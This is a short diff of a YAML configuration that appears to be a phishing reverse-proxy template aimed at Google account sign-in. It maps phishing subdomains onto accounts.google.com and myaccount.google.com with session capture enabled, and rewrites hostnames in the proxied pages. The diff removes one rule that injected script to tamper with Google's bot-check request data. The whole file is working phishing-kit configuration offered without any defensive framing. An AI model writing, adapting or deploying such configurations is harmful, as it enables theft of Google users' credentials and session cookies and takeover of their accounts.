@@ -6,7 +6,6 @@ proxy_hosts:
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: '(bgRequest=[A-z])\)', replace: "${1}) && (e.bgRequest[Object.keys(e.bgRequest)[2]][1] = \"FNL\")", mimes: ['text/html', 'application/json']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
 
